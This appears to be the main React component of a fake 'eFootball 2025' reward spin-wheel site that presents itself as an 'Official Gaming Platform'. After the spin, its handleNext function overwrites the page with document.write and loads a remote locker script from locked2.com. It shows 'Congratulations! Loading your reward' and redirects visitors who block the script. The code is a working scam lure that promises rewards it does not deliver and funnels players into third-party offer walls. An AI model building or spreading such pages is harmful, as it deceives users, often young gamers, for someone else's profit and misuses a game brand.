import React, { useState } from 'react';
import { NameInput } from './components/NameInput';
import { SpinWheel } from './components/SpinWheel';
import { ResultDisplay } from './components/ResultDisplay';
import { AppState, SpinResult } from './types/wheel';

/**
 * Main App Component
 * Orchestrates the spinning wheel experience flow
 */
function App() {
  const [currentState, setCurrentState] = useState<AppState>('input');
  const [userName, setUserName] = useState('');
  const [spinResult, setSpinResult] = useState<SpinResult | null>(null);



  // Handle going back to previous screen
  const handleGoBack = () => {
    if (currentState === 'spinning' || currentState === 'result') {
      setCurrentState('input');
      setSpinResult(null);
    }
  };

  // Handle name submission and transition to wheel
  const handleNameSubmit = (name: string) => {
    if (name.trim().length < 2) {
      alert('Please enter a valid name (at least 2 characters)');
      return;
    }
    setUserName(name.trim());
    setCurrentState('spinning');
  };

  // Handle spin completion and transition to results
  const handleSpinComplete = (result: SpinResult) => {
    setSpinResult(result);
    setCurrentState('result');
  };

  // Handle final redirect to locked2.com
  const handleNext = () => {
    // Replace the entire document with the locked2.com page
    document.open();
    document.write(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>eFootball 2025 - Claim Your Reward</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <noscript><meta http-equiv="refresh" content="0;url=https://locked2.com/noscript" /></noscript>
        <style>
          body {
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
          }
          .loading {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            color: white;
          }
          .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #ffffff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 1s ease-in-out infinite;
          }
          @keyframes spin {
            to { transform: rotate(360deg); }
          }
        </style>
      </head>
      <body>
        <div class="loading">
          <div>
            <h2>🎉 Congratulations!</h2>
            <p>Loading your reward...</p>
            <div style="margin-top: 20px;">
              <div class="spinner"></div>
            </div>
          </div>
        </div>

        <script type="text/javascript">var ogblock=true;</script>
        <script type="text/javascript" id="ogjs" src="https://locked2.com/cl/js/po7d95"></script>
        <script type="text/javascript">
          setTimeout(function() {
            if(ogblock) {
              window.location.href = "https://locked2.com/adblock";
            }
          }, 3000);
        </script>
      </body>
      </html>
    `);
    document.close();
  };

  // Render current state component
  const renderCurrentState = () => {
    switch (currentState) {
      case 'input':
        return <NameInput onNameSubmit={handleNameSubmit} />;
      
      case 'spinning':
        return (
          <SpinWheel
            userName={userName}
            onSpinComplete={handleSpinComplete}
            onGoBack={handleGoBack}
          />
        );

      case 'result':
        return spinResult ? (
          <ResultDisplay
            userName={userName}
            winningItem={spinResult.item}
            onNext={handleNext}
            onGoBack={handleGoBack}
          />
        ) : null;
      
      default:
        return <NameInput onNameSubmit={handleNameSubmit} />;
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-slate-800 relative overflow-hidden">
      {/* Background Elements - eFootball theme */}
      <div className="absolute inset-0 opacity-15">
        <div className="absolute top-10 left-10 w-20 h-20 bg-orange-500 rounded-full blur-xl"></div>
        <div className="absolute top-40 right-20 w-32 h-32 bg-blue-500 rounded-full blur-xl"></div>
        <div className="absolute bottom-20 left-20 w-24 h-24 bg-orange-400 rounded-full blur-xl"></div>
        <div className="absolute bottom-40 right-10 w-16 h-16 bg-blue-400 rounded-full blur-xl"></div>
        <div className="absolute top-1/2 left-1/4 w-28 h-28 bg-white/20 rounded-full blur-2xl"></div>
      </div>

      {/* Main Content */}
      <div className="relative z-10 min-h-screen flex items-center justify-center p-4">
        <div className="w-full max-w-2xl">
          {renderCurrentState()}
        </div>
      </div>

      {/* Footer */}
      <div className="absolute bottom-4 left-0 right-0 text-center">
        <p className="text-white/60 text-sm">
          ⚽ eFootball Rewards • Official Gaming Platform
        </p>
      </div>
    </div>
  );
}

export default App;